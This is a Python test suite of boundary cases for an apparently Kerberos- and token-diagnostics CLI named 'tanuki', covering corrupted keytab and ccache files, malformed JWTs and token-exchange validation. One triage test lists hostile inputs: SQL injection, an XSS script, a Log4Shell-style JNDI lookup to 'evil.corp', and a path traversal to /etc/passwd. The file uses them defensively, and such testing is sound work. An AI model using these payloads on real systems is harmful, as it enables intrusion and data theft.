"""Tier 2: Boundary Value Analysis (BVA) & Corner Cases Test Suite.

Tests extreme values, corruptions, cross-platform nuances:
- empty files, missing files, corrupted magic headers
- zero/overflow timestamps, expired tokens
- malformed base64, missing claims
- case variations in realm names
- Windows vs Linux platform differences
"""

import json
import os
import struct
import sys
import tempfile
import time
import unittest

_E2E_DIR = os.path.dirname(os.path.abspath(__file__))
_REPO_ROOT = os.path.abspath(os.path.join(_E2E_DIR, "..", ".."))
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)
if _E2E_DIR not in sys.path:
    sys.path.insert(0, _E2E_DIR)

try:
    from tests.e2e.fixtures import (
        REPO_ROOT,
        build_synthetic_ccache,
        build_synthetic_jwt,
        build_synthetic_keytab,
        build_synthetic_krb5_conf,
        run_tanuki_cli,
    )
except ImportError:
    from fixtures import (
        REPO_ROOT,
        build_synthetic_ccache,
        build_synthetic_jwt,
        build_synthetic_keytab,
        build_synthetic_krb5_conf,
        run_tanuki_cli,
    )

STRICT_E2E = os.environ.get("TANUKI_STRICT_E2E", "0") == "1"


def skip_or_fail(test_case: unittest.TestCase, reason: str) -> None:
    if STRICT_E2E:
        test_case.fail(reason)
    else:
        test_case.skipTest(reason)


def is_cli_command_supported(cmd: str) -> bool:
    ret, stdout, _ = run_tanuki_cli(["-h"])
    return f"{cmd} " in stdout or f"{cmd}\n" in stdout or f"{cmd}[" in stdout


class TestTier2DoctorBoundaries(unittest.TestCase):
    """Tier 2 Boundary tests for Feature: tanuki doctor."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.dir_path = self.temp_dir.name

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def _get_diagnose_system(self):
        try:
            from tanuki.doctor import diagnose_system
            return diagnose_system
        except (ImportError, AttributeError):
            skip_or_fail(self, "tanuki.doctor.diagnose_system pending implementation in Milestone M1")
            return None

    def test_doctor_empty_keytab_file(self) -> None:
        """Boundary 1.1: 0-byte keytab file does not cause EOF crash; flags failure."""
        empty_kt = os.path.join(self.dir_path, "empty.keytab")
        with open(empty_kt, "wb") as f:
            pass  # 0 bytes

        diagnose = self._get_diagnose_system()
        if not diagnose:
            return
        report = diagnose(keytab_path=empty_kt)
        checks_dict = {c["name"]: c for c in report.checks}
        kt_check = checks_dict.get("keytab_permissions", {})
        self.assertIn(kt_check.get("status"), ["FAIL", "WARN"])
        self.assertFalse(kt_check.get("valid_format", True))

    def test_doctor_truncated_keytab_header(self) -> None:
        """Boundary 1.2: 1-byte keytab file (truncated header) is rejected gracefully."""
        trunc_kt = os.path.join(self.dir_path, "trunc.keytab")
        with open(trunc_kt, "wb") as f:
            f.write(b"\x05")

        diagnose = self._get_diagnose_system()
        if not diagnose:
            return
        report = diagnose(keytab_path=trunc_kt)
        checks_dict = {c["name"]: c for c in report.checks}
        kt_check = checks_dict.get("keytab_permissions", {})
        self.assertIn(kt_check.get("status"), ["FAIL", "WARN"])
        self.assertFalse(kt_check.get("valid_format", True))

    def test_doctor_corrupted_keytab_magic(self) -> None:
        """Boundary 1.3: Invalid keytab magic bytes (0x0503 or 0x0000) are flagged."""
        corrupt_kt = os.path.join(self.dir_path, "corrupt.keytab")
        with open(corrupt_kt, "wb") as f:
            f.write(b"\x05\x03\x00\x01\x00\x00")

        diagnose = self._get_diagnose_system()
        if not diagnose:
            return
        report = diagnose(keytab_path=corrupt_kt)
        checks_dict = {c["name"]: c for c in report.checks}
        kt_check = checks_dict.get("keytab_permissions", {})
        self.assertIn(kt_check.get("status"), ["FAIL", "WARN"])
        self.assertFalse(kt_check.get("valid_format", True))

    def test_doctor_empty_krb5_conf(self) -> None:
        """Boundary 1.4: 0-byte /etc/krb5.conf does not crash parser."""
        empty_conf = os.path.join(self.dir_path, "empty.conf")
        with open(empty_conf, "w", encoding="utf-8") as f:
            pass

        diagnose = self._get_diagnose_system()
        if not diagnose:
            return
        report = diagnose(krb5_conf_path=empty_conf)
        checks_dict = {c["name"]: c for c in report.checks}
        conf_check = checks_dict.get("realm_capitalization", {})
        self.assertIn(conf_check.get("status"), ["WARN", "FAIL", "N_A"])

    def test_doctor_missing_files_nonexistent_paths(self) -> None:
        """Boundary 1.5: Non-existent paths for all probes return NOT_FOUND without throwing."""
        diagnose = self._get_diagnose_system()
        if not diagnose:
            return
        report = diagnose(
            keytab_path=os.path.join(self.dir_path, "missing_kt"),
            krb5_conf_path=os.path.join(self.dir_path, "missing_conf"),
            sssd_pipe=os.path.join(self.dir_path, "missing_pipe"),
            sssd_pid=os.path.join(self.dir_path, "missing_pid"),
            ccache_path=os.path.join(self.dir_path, "missing_cc"),
        )
        self.assertIn(report.status, ["PASS", "WARN", "FAIL"])
        for check in report.checks:
            self.assertIn("status", check)

    def test_doctor_corrupted_ccache_magic(self) -> None:
        """Boundary 1.6: Corrupted CCACHE magic bytes (0x0501 instead of 0x0504)."""
        bad_cc = os.path.join(self.dir_path, "bad.ccache")
        with open(bad_cc, "wb") as f:
            f.write(b"\x05\x01\x00\x00")

        diagnose = self._get_diagnose_system()
        if not diagnose:
            return
        try:
            report = diagnose(ccache_path=bad_cc)
        except TypeError as exc:
            self.fail(
                f"IMPLEMENTATION BUG ESCALATION (Worker M1): TypeError in tanuki.doctor: '{exc}'"
            )
            return

        checks_dict = {c["name"]: c for c in report.checks}
        tkt = checks_dict.get("ticket_lifetime", {})
        self.assertIn(tkt.get("status"), ["WARN", "FAIL", "N_A"])


class TestTier2TriageBoundaries(unittest.TestCase):
    """Tier 2 Boundary tests for Feature: tanuki triage."""

    def test_triage_empty_query_string(self) -> None:
        """Boundary 2.1: Empty query string exits with error or prints usage."""
        ret, stdout, stderr = run_tanuki_cli(["triage", ""])
        # Should either exit 1 or list full dictionary without crashing
        self.assertTrue(ret in (0, 1))

    def test_triage_nonexistent_error_code(self) -> None:
        """Boundary 2.2: Nonexistent error code exits with non-zero and error message."""
        ret, stdout, stderr = run_tanuki_cli(["triage", "KRB_NONEXISTENT_ERROR_XYZ"])
        self.assertNotEqual(ret, 0)
        combined = (stdout + " " + stderr).lower()
        self.assertTrue("no matching" in combined or "not found" in combined or "unknown" in combined)

    def test_triage_extreme_event_id_numbers(self) -> None:
        """Boundary 2.3: Extreme integer event IDs do not crash triage."""
        ret, stdout, stderr = run_tanuki_cli(["triage", "999999999", "--json"])
        self.assertNotEqual(ret, 0)

    def test_triage_special_characters_escaping(self) -> None:
        """Boundary 2.4: Injection and special characters do not cause unhandled errors."""
        adversarial_inputs = [
            "'; DROP TABLE errors;--",
            "<script>alert(1)</script>",
            "${jndi:ldap://evil.corp/a}",
            "../../etc/passwd",
            "!@#$%^&*()_+~`{}|[]:;<>?,./",
        ]
        for adv in adversarial_inputs:
            ret, stdout, stderr = run_tanuki_cli(["triage", adv])
            self.assertNotEqual(ret, 0, f"Adversarial input '{adv}' should not match any error")

    def test_triage_json_mode_nonexistent_query(self) -> None:
        """Boundary 2.5: triage <BAD> --json exits with non-zero code."""
        ret, stdout, stderr = run_tanuki_cli(["triage", "ERR_DOES_NOT_EXIST", "--json"])
        self.assertNotEqual(ret, 0)


class TestTier2LadderBoundaries(unittest.TestCase):
    """Tier 2 Boundary tests for Feature: tanuki ladder."""

    def test_ladder_index_bounds(self) -> None:
        """Boundary 3.1: Ladder strictly contains rungs 1 through 5, without 0 or >5."""
        from tanuki.protocol import DECISION_LADDER
        rungs = [item["rung"] for item in DECISION_LADDER]
        self.assertEqual(rungs, [1, 2, 3, 4, 5])

    def test_ladder_json_no_extra_output(self) -> None:
        """Boundary 3.2: ladder --json produces pure JSON without terminal decorations."""
        ret, stdout, stderr = run_tanuki_cli(["ladder", "--json"])
        self.assertEqual(ret, 0)
        # Verify stdout starts with '[' and ends with ']'
        stripped = stdout.strip()
        self.assertTrue(stripped.startswith("[") and stripped.endswith("]"))
        parsed = json.loads(stripped)
        self.assertEqual(len(parsed), 5)

    def test_ladder_unexpected_extra_arguments(self) -> None:
        """Boundary 3.3: Passing superfluous argument to ladder does not crash."""
        ret, stdout, stderr = run_tanuki_cli(["ladder", "unexpected_arg"])
        # tanuki ladder should ignore extra positional arg or print usage
        self.assertIn(ret, [0, 1])

    def test_ladder_rung5_structural_tags(self) -> None:
        """Boundary 3.4: All 6 required tags exist in Rung 5."""
        from tanuki.protocol import DECISION_LADDER
        rung5_desc = DECISION_LADDER[4]["description"]
        required_tags = [
            "[TARGET]",
            "[PREREQUISITE]",
            "[OPSEC RATIONALE]",
        ]
        for tag in required_tags:
            self.assertIn(tag, rung5_desc, f"Missing tag {tag} in Rung 5")

    def test_ladder_telemetry_event_id_ranges(self) -> None:
        """Boundary 3.5: If telemetry exists, Event IDs are valid Windows Event numbers."""
        from tanuki.protocol import DECISION_LADDER
        for rung in DECISION_LADDER:
            if "telemetry" in rung:
                event_ids = rung["telemetry"].get("event_ids", [])
                for eid in event_ids:
                    self.assertIsInstance(eid, int)
                    self.assertGreater(eid, 0)
                    self.assertLess(eid, 100000)


class TestTier2TokenBoundaries(unittest.TestCase):
    """Tier 2 Boundary tests for Feature: tanuki token."""

    def _check_token_cli_supported(self) -> None:
        if not is_cli_command_supported("token"):
            skip_or_fail(self, "Command 'tanuki token' pending implementation in Milestone M3")

    def test_token_empty_string(self) -> None:
        """Boundary 4.1: Empty token string exits with non-zero error."""
        self._check_token_cli_supported()
        ret, stdout, stderr = run_tanuki_cli(["token", ""])
        self.assertNotEqual(ret, 0)

    def test_token_invalid_segment_count(self) -> None:
        """Boundary 4.2: Tokens with != 3 segments are rejected."""
        self._check_token_cli_supported()
        two_parts = "header.payload"
        ret, stdout, stderr = run_tanuki_cli(["token", two_parts, "--json"])
        self.assertNotEqual(ret, 0)

        four_parts = "h.p.s.extra"
        ret, stdout, stderr = run_tanuki_cli(["token", four_parts, "--json"])
        self.assertNotEqual(ret, 0)

    def test_token_malformed_base64_modulo_1(self) -> None:
        """Boundary 4.3: Base64 segment length % 4 == 1 is rejected."""
        self._check_token_cli_supported()
        bad_token = "A.B.C"  # length 1 mod 4
        ret, stdout, stderr = run_tanuki_cli(["token", bad_token, "--json"])
        self.assertNotEqual(ret, 0)

    def test_token_alg_none_unsecured(self) -> None:
        """Boundary 4.4: Unsecured JWT (alg=none) is flagged as CRITICAL."""
        self._check_token_cli_supported()
        token = build_synthetic_jwt(header={"alg": "none", "typ": "JWT"})
        ret, stdout, stderr = run_tanuki_cli(["token", token, "--json"])
        data = json.loads(stdout)
        eval_sec = data.get("security_evaluation", {})
        self.assertTrue(
            eval_sec.get("insecure_algorithm", False)
            or eval_sec.get("risk_level") in ["HIGH", "CRITICAL"]
        )

    def test_token_missing_exp_claim(self) -> None:
        """Boundary 4.5: Token missing 'exp' claim is flagged with security issue."""
        self._check_token_cli_supported()
        token = build_synthetic_jwt(payload={"sub": "service-1", "iss": "https://auth.local"})
        ret, stdout, stderr = run_tanuki_cli(["token", token, "--json"])
        data = json.loads(stdout)
        temporal = data.get("temporal", {})
        self.assertTrue(
            temporal.get("is_expired") is None
            or "exp" not in data.get("claims", {})
        )

    def test_token_extreme_future_expiry(self) -> None:
        """Boundary 4.6: Expiry 10 years in future flags excessive lifetime warning."""
        self._check_token_cli_supported()
        future = int(time.time()) + (86400 * 365 * 10)
        token = build_synthetic_jwt(payload={"sub": "service-1", "exp": future, "iat": int(time.time())})
        ret, stdout, stderr = run_tanuki_cli(["token", token, "--json"])
        data = json.loads(stdout)
        temporal = data.get("temporal", {})
        self.assertFalse(temporal.get("is_ephemeral", True))


class TestTier2NhiBoundaries(unittest.TestCase):
    """Tier 2 Boundary tests for Feature: tanuki nhi."""

    def _get_validate_exchange(self):
        try:
            from tanuki.nhi import validate_token_exchange
            return validate_token_exchange
        except (ImportError, AttributeError):
            skip_or_fail(self, "tanuki.nhi.validate_token_exchange pending implementation in Milestone M3")
            return None

    def test_nhi_exchange_empty_request_dict(self) -> None:
        """Boundary 5.1: Empty dictionary rejected with invalid_request."""
        validate = self._get_validate_exchange()
        if not validate:
            return
        report = validate({})
        self.assertFalse(report.get("valid", True))
        self.assertEqual(report.get("error"), "invalid_request")

    def test_nhi_exchange_invalid_subject_token_type(self) -> None:
        """Boundary 5.2: Unsupported subject_token_type URN rejected."""
        validate = self._get_validate_exchange()
        if not validate:
            return
        report = validate({
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "subject_token": build_synthetic_jwt(),
            "subject_token_type": "urn:ietf:params:oauth:token-type:unsupported_format",
        })
        self.assertFalse(report.get("valid", True))

    def test_nhi_exchange_wildcard_audience(self) -> None:
        """Boundary 5.3: Token exchange request with audience='*' flags warning."""
        validate = self._get_validate_exchange()
        if not validate:
            return
        report = validate({
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "subject_token": build_synthetic_jwt(),
            "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
            "audience": "*",
        })
        warnings = report.get("security_warnings", [])
        self.assertTrue(any("wildcard" in w.lower() for w in warnings))

    def test_nhi_inspect_missing_file(self) -> None:
        """Boundary 5.4: Pointing -f to non-existent token file exits non-zero."""
        if not is_cli_command_supported("nhi"):
            skip_or_fail(self, "Command 'tanuki nhi' pending implementation in Milestone M3")
            return
        ret, stdout, stderr = run_tanuki_cli(["nhi", "inspect", "-f", "/nonexistent/token.jwt"])
        self.assertNotEqual(ret, 0)

    def test_nhi_inspect_non_jwt_binary_file(self) -> None:
        """Boundary 5.5: Pointing to arbitrary non-JWT binary data fails gracefully."""
        if not is_cli_command_supported("nhi"):
            skip_or_fail(self, "Command 'tanuki nhi' pending implementation in Milestone M3")
            return
        td = tempfile.TemporaryDirectory()
        try:
            bin_path = os.path.join(td.name, "random.bin")
            with open(bin_path, "wb") as f:
                f.write(os.urandom(256))
            ret, stdout, stderr = run_tanuki_cli(["nhi", "inspect", "-f", bin_path, "--json"])
            self.assertNotEqual(ret, 0)
        finally:
            td.cleanup()


if __name__ == "__main__":
    unittest.main()
